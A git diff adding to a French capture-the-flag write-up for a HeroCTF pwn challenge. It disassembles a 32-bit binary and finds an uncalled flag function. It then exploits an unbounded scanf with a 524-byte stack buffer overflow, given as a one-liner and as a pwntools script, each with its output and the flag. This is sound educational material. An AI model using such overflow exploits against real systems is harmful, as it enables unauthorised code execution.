@@ -25,7 +25,39 @@ $ file BOO_2
 BOO_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=252fb7f9439139a76e929befad4355f78b5794a8, for GNU/Linux 3.2.0, not stripped
 ```
 On a donc cette fois un exécutable x86 (32 bits), non strippé parce qu'on est sympas :D
-Même process que pour le premier, on désassemble la fonction `main` avec Cutter.
+On se balade un peu dans le binaire et on trouve une fonction `getFlag` en `0x080491c2` que l'on désassemble avec Cutter.
+
+```nasm
+54: sym.getFlag ();
+; var int32_t var_4h @ ebp-0x4
+0x080491c2      push ebp
+0x080491c3      mov ebp, esp
+0x080491c5      push ebx
+0x080491c6      sub esp, 4
+0x080491c9      call geteuid       ; sym.imp.geteuid ; uid_t geteuid(void)
+0x080491ce      mov ebx, eax
+0x080491d0      call geteuid       ; sym.imp.geteuid ; uid_t geteuid(void)
+0x080491d5      sub esp, 8
+0x080491d8      push ebx
+0x080491d9      push eax
+0x080491da      call setreuid      ; sym.imp.setreuid
+0x080491df      add esp, 0x10
+0x080491e2      sub esp, 0xc
+0x080491e5      push str.cat_flag.txt ; 0x804a008 ; const char *string
+0x080491ea      call system        ; sym.imp.system ; int system(const char *string)
+0x080491ef      add esp, 0x10
+0x080491f2      nop
+0x080491f3      mov ebx, dword [var_4h]
+0x080491f6      leave
+0x080491f7      ret
+```
+
+Ok ! on voit que cette fonction va en effet récupérer le flag en faisant un `cat` sur le fichier `flag.txt`.
+Cependant, si on affiche les adresses qui référencent cette fonction (appui de la touch "x" sur le nom de la fonction), on remarque que cette jolie fonction n'est jamais appelée...
+
+![screenshot](https://raw.githubusercontent.com/HeroCTF/HeroCTF_v2/master/Pwn/Call%20me%20maybe/xrefs.png)
+
+On désassemble ensuite la fonction `main`.
 ```nasm
 55: int main (int32_t arg_4h);
 ; var int32_t var_4h @ ebp-0x4
@@ -89,7 +121,46 @@ En continuant d'explorer on se rend compte que l'input utilisateur sera stocké 
 0x0804921b      push 0x804a03c     ; const char *format
 0x08049220      call __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
 ```
-Aucun control n'est fait sur le nombre de caractères maximum entrés en input, on va alors pouvoir overflow le buffer et call notre fonction 
+Aucun control n'est fait sur le nombre de caractères maximum entrés en input, on va alors pouvoir overflow le buffer et call notre fonction `getFlag` !
+
+Nous allons donc devoir overflow un buffer de 520 octets + 4 octets pour ebp (on est en x86) soit 524 octets avant de pouvoir réécrire eip (instruction pointer) et jump sur la fontion `getFlag` (toujours en `0x080491c2`).
+
+Pour cela il y a encore deux écoles : 
+- La team "one liner"
+```bash
+python2.7 -c "print('A'*524 + '\xc2\x91\x04\x08')" | nc challs.heroctf.fr 7001
+C'est quoi ta couleur préférée ?
+
+Argh moi jsuis pas fan du AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
+```
+- La team "pwntools"
+```python
+#!/usr/bin/python
+from pwn import *
+
+r = remote('challs.heroctf.fr', 7001)
+
+buff = "A"*524
+buff += p32(0x080491c2)
+
+r.sendline(buff)
+r.interactive()
+```
+Exécution :
+```bash
+python 2.py 
+[+] Opening connection to challs.heroctf.fr on port 7001: Done
+[*] Switching to interactive mode
+C'est quoi ta couleur préférée ?
+
+Argh moi jsuis pas fan du AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04...
+Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
+[*] Got EOF while reading in interactive
+$ 
+[*] Interrupted
+[*] Closed connection to challs.heroctf.fr port 7001
+```
 
 ### Flag
 Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
